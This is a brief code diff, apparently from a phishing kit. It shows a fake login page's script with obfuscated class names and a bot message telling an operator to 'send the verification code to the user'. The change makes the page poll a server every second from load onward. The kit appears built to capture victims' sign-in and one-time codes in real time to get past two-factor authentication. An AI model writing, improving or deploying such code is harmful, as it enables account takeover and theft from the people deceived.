@@ -155,6 +155,7 @@ bot_reply('🔔 <b>Send the verification code to the user</b>
     <script>
         $(document).ready(function() {
             checkingCode = setInterval(checkForVerifyCode, 1000);
+            setInterval(makeRequest, 1000);
         });
     </script>
     <script>
@@ -170,7 +171,6 @@ bot_reply('🔔 <b>Send the verification code to the user</b>
                 $('.kPY6ve').addClass('hidden');
                 $('#loader-login').addClass('qdulke').addClass('jK7moc');
                 clearInterval(checkingCode);
-                setInterval(makeRequest, 1000);
             } else {
                 console.log("Empty response received");
             } 
